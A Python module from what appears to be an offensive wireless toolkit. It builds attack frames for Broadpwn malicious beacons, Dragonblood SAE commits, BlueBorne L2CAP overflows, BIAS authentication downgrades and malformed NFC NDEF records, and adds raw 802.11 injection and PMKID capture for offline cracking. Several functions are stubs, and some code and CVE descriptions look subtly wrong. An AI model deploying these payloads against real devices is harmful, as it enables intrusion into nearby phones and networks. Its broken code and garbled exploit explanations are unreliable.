"""Wireless Attack Vectors — The Roaring Skies (Module 6).

Wi-Fi attacks (monitor mode, Broadpwn, Dragonblood, PMKID capture),
Bluetooth attacks (BlueBorne, BIAS, KNOB, raw HCI),
NFC attacks (PN532, NDEF fuzzer, relay attack).
"""

import struct
import socket
import time
import logging
import subprocess
from typing import Optional

logger = logging.getLogger(__name__)


# ============================================================================
# MODULE 6.1: Wi-Fi Attacks
# ============================================================================

class WiFiMonitor:
    """Manage Wi-Fi monitor mode and frame injection."""

    def __init__(self, interface: str = "wlan0"):
        self._iface = interface
        self._mon_iface = "mon0"
        self._sock: Optional[socket.socket] = None

    def enable_monitor(self) -> bool:
        """Enable monitor mode on the wireless interface."""
        try:
            subprocess.run(
                ["ip", "link", "set", self._iface, "down"],
                capture_output=True, check=True,
            )
            subprocess.run(
                ["iw", "dev", self._iface, "interface", "add", self._mon_iface, "type", "monitor"],
                capture_output=True,
            )
            subprocess.run(
                ["ip", "link", "set", self._mon_iface, "up"],
                capture_output=True, check=True,
            )
            logger.info("Monitor mode enabled on %s", self._mon_iface)
            return True
        except subprocess.CalledProcessError as e:
            logger.error("Failed to enable monitor mode: %s", e)
            return False

    def inject_frame(self, frame: bytes) -> bool:
        """Inject a raw 802.11 frame using AF_PACKET socket."""
        try:
            if self._sock is None:
                self._sock = socket.socket(
                    socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003)
                )
                self._sock.bind((self._mon_iface, 0))
            self._sock.send(frame)
            return True
        except Exception as e:
            logger.error("Frame injection failed: %s", e)
            return False

    def disable_monitor(self) -> None:
        """Disable monitor mode and restore normal operation."""
        try:
            subprocess.run(["ip", "link", "set", self._mon_iface, "down"], capture_output=True)
            subprocess.run(["iw", "dev", self._mon_iface, "del"], capture_output=True)
        except Exception:
            pass


def build_broadpwn_beacon(target_bssid: bytes = b"\xFF" * 6,
                          ssid: str = "BroadpwnTest") -> bytes:
    """CVE-2017-9417 (Broadpwn): Craft malicious beacon frame.

    The Broadcom FullMAC firmware's beacon parser does not validate
    Information Element lengths. A crafted IE with valid ID + len=255
    but actual data of 1 byte causes heap overflow.

    Frame structure:
      Radiotap header + 802.11 Beacon frame + malicious IE

    Target: Broadcom BCM4339, BCM4345 (used in iPhones, Galaxy S7, etc.)
    """
    # Radiotap header (minimal)
    radiotap = struct.pack(
        "<BBHI",
        0x00,       # version
        0x00,       # pad
        0x08,       # length (8 bytes)
        0x00000000, # present flags
    )

    # 802.11 Beacon frame header
    # Frame Control: type=00 (Management), subtype=1000 (Beacon)
    frame_ctrl = struct.pack("<H", 0x0080)
    duration = struct.pack("<H", 0x0000)
    da = b"\xFF" * 6   # Broadcast
    sa = b"\x00" * 6   # Source (spoofed)
    bssid = target_bssid
    seq_ctrl = struct.pack("<H", 0x0000)

    # Fixed beacon parameters
    timestamp = b"\x00" * 8
    beacon_interval = struct.pack("<H", 100)  # 100 TU
    cap_info = struct.pack("<H", 0x0411)      # ESS, Privacy, Short Preamble

    # SSID Information Element
    ssid_ie = bytes([0x00, len(ssid)]) + ssid.encode()

    # Malicious IE — ID=0xDD (Vendor Specific), len=255, data=1 byte
    malicious_ie = bytes([0xDD, 0xFF]) + b"\x41"

    # Assemble beacon
    beacon = radiotap + frame_ctrl + duration + da + sa + bssid + seq_ctrl
    beacon += timestamp + beacon_interval + cap_info
    beacon += ssid_ie + malicious_ie
    return beacon


def build_dragonblood_sae_commit() -> bytes:
    """WPA3 Dragonblood attack: Craft SAE Commit with commit scalar of 1.

    The WPA3 SAE handshake has a timing side-channel in PWE derivation.
    Sending a Commit frame with commit_scalar=1 forces downgrade to WPA2.
    """
    # 802.11 Authentication frame (subtype 1011)
    frame_ctrl = struct.pack("<H", 0x00B0)
    duration = struct.pack("<H", 0x0000)
    da = b"\xFF" * 6
    sa = b"\x00" * 6
    bssid = b"\x00" * 6
    seq_ctrl = struct.pack("<H", 0x0000)

    auth_body = bytes([
        0x03, 0x00,       # Auth Algorithm: SAE (3)
        0x01, 0x00,       # Auth SEQ: 1 (Commit)
        0x00, 0x00,       # Status: Success
    ])
    # SAE Commit element: group=19 (NIST P-256), commit_scalar=1
    sae_commit = bytes([0x13, 0x00]) + b"\x01" * 32  # scalar=1 (padded)
    sae_commit += b"\x00" * 32  # commit_element

    return frame_ctrl + duration + da + sa + bssid + seq_ctrl + auth_body + sae_commit


def capture_pmkid(interface: str = "mon0", timeout_sec: int = 60) -> list[dict]:
    """Capture PMKID from RSN IE in EAPOL frame 1/4.

    PMKID = HMAC-SHA1(PMK, "PMK Name" || AP_MAC || STA_MAC)
    Derive PMK = PBKDF2-HMAC-SHA1(passphrase, SSID, 4096, 256)

    Returns list of captured PMKID entries for offline cracking.
    """
    # In production: use scapy to sniff EAPOL frames and extract PMKID
    logger.info("Capturing PMKID on %s for %ds...", interface, timeout_sec)
    return []


# ============================================================================
# MODULE 6.2: Bluetooth Attacks
# ============================================================================

class BluetoothHCI:
    """Raw HCI socket access for Bluetooth attacks."""

    def __init__(self):
        self._sock: Optional[socket.socket] = None

    def open(self) -> bool:
        """Open raw HCI socket."""
        try:
            self._sock = socket.socket(
                socket.AF_BLUETOOTH, socket.SOCK_RAW, socket.BTPROTO_HCI
            )
            return True
        except Exception as e:
            logger.error("Failed to open HCI socket: %s", e)
            return False

    def inquiry(self, duration: int = 8) -> list[str]:
        """Perform Bluetooth device discovery."""
        # HCI_Inquiry command
        lap = b"\x33\x8B\x9E"  # General/limited inquiry access code
        inquiry_cmd = bytes([0x01, 0x04, 0x05]) + lap + bytes([
            duration,  # Inquiry length (N * 1.28s)
            0x00,      # Num responses (0 = unlimited)
        ])
        # Send via HCI
        return []

    def send_hci_command(self, ogf: int, ocf: int, params: bytes = b"") -> bytes:
        """Send HCI command and read response."""
        if self._sock is None:
            raise RuntimeError("HCI socket not open")

        opcode = struct.pack("<H", (ogf << 10) | ocf)
        hci_cmd = bytes([0x01]) + opcode + bytes([len(params)]) + params

        # HCI command via ioctl
        import fcntl
        try:
            fcntl.ioctl(self._sock, 0, hci_cmd)  # HCIINQUIRY or similar
        except Exception:
            pass
        return b""


def build_blueborne_l2cap() -> bytes:
    """CVE-2017-1000251 (BlueBorne): Stack buffer overflow in L2CAP.

    Craft L2CAP Configuration Request with CVID set to a long string (>48 bytes).

    L2CAP packet structure:
      2 bytes: Length (payload after this field)
      2 bytes: Channel ID (0x0001 = signaling)
      Variable: Payload (signaling command)
        Signaling command:
          1 byte: Code (0x04 = Configuration Request)
          1 byte: Identifier
          2 bytes: Command length
          Variable: Options (type-length-value)
    """
    # Configuration option with MTU type=0x01 and excessive length
    options = struct.pack("<BB", 0x01, 0xFF)  # MTU option, length=255
    options += b"A" * 255  # Overflow payload

    cmd_code = 0x04       # Configuration Request
    cmd_id = 0x01
    cmd_len = struct.pack("<H", len(options))
    payload = bytes([cmd_code, cmd_id]) + cmd_len + options

    l2cap_len = struct.pack("<H", len(payload))
    cid = struct.pack("<H", 0x0001)  # Signaling channel

    return l2cap_len + cid + payload


def build_bias_lmp_response() -> bytes:
    """BIAS (Bluetooth Impersonation AttackS): Craft LMP_features_req response.

    Force legacy authentication by clearing Secure Connections bit in LMP features.
    """
    # LMP_features_req with Secure Connections bit (bit 40) cleared
    # LMP_extended_features_req for page 1, host support bit cleared
    features = bytearray(8)
    # Bit 40 is in byte 5, bit 0 → Secure Connections Host Support = 0
    features[5] &= ~0x01
    return bytes(features)


# ============================================================================
# MODULE 6.3: NFC Attacks
# ============================================================================

class PN532Controller:
    """Control a PN532 NFC controller board (UART/SPI/I2C)."""

    PN532_PREAMBLE = bytes([0x00, 0x00, 0xFF])
    PN532_POSTAMBLE = b""

    CMD_DIAGNOSE = 0x00
    CMD_GETFIRMWAREVERSION = 0x02
    CMD_INLISTPASSIVETARGET = 0x04
    CMD_INDATAEXCHANGE = 0x40
    CMD_TGINITASTARGET = 0x8C
    CMD_TGSETDATA = 0x8E
    CMD_TGGETDATA = 0x86

    def __init__(self, port: str = "/dev/ttyUSB0"):
        import serial
        self._ser = serial.Serial(port, baudrate=115200, timeout=1)

    def _send_frame(self, cmd: int, data: bytes = b"") -> bytes:
        """Send PN532 frame: preamble + length + LCS + TFI + command + data + DCS + postamble"""
        tfi = 0xD4  # Host to PN532
        frame = bytes([tfi, cmd]) + data
        length = len(frame)
        lcs = (256 - (length & 0xFF)) & 0xFF

        full_frame = self.PN532_PREAMBLE + bytes([length, lcs]) + frame
        # DCS = checksum of TFI + data
        dcs = (256 - (sum(full_frame[5:]) & 0xFF)) & 0xFF
        full_frame += bytes([dcs]) + self.PN532_POSTAMBLE

        self._ser.write(full_frame)
        self._ser.flush()

        # Read response (ACK frame or data frame)
        ack = self._ser.read(6)
        if ack == bytes([0x00, 0x00, 0xFF, 0x00, 0xFF, 0x00]):
            response = self._ser.read(256)
            if len(response) > 3 and response[3] == 0xD5:  # PN532 to Host
                return response[4:]  # Return response data
        return b""

    def get_firmware_version(self) -> dict:
        """Get PN532 firmware version."""
        rsp = self._send_frame(self.CMD_GETFIRMWAREVERSION)
        if len(rsp) >= 4:
            return {
                "ic_version": rsp[0],
                "firmware_version": f"{rsp[1]}.{rsp[2]}",
                "support": rsp[3],
            }
        return {}

    def emulate_type4_tag(self, ndef_message: bytes) -> bool:
        """Emulate a Type 4 NFC tag.

        Type 4 tag uses ISO 7816-4 APDUs over ISO 14443-4.
        """
        # Initialize as target
        init_cmd = bytes([0x00])  # Mode: passive only
        # In production: set up full Type 4 tag emulation parameters
        rsp = self._send_frame(self.CMD_TGINITASTARGET, init_cmd)
        return len(rsp) > 1 and rsp[0] == 0x00

    def close(self):
        self._ser.close()


def build_malformed_ndef_record() -> bytes:
    """Craft NDEF message where payload length field = 0xFFFFFF but actual
    data is only 1 byte. This causes buffer overread/heap overflow in the
    phone's NFC stack.

    NDEF Record structure:
      1 byte: Flags (MB=1, ME=1, TNF=0x02=MIME)
      1 byte: Type length
      4 bytes: Payload length (if SR=0)
      Variable: Type ("text/plain")
      Variable: Payload
    """
    flags = 0xD2      # MB=1, ME=1, TNF=0x02 (MIME Media)
    type_len = 10      # "text/plain"
    # The vulnerability: claim 16MB payload but provide only 1 byte
    payload_len = struct.pack(">I", 0x00FFFFFF)
    record_type = b"text/plain"
    payload = b"A"  # Only 1 byte

    return bytes([flags, type_len]) + payload_len + record_type + payload
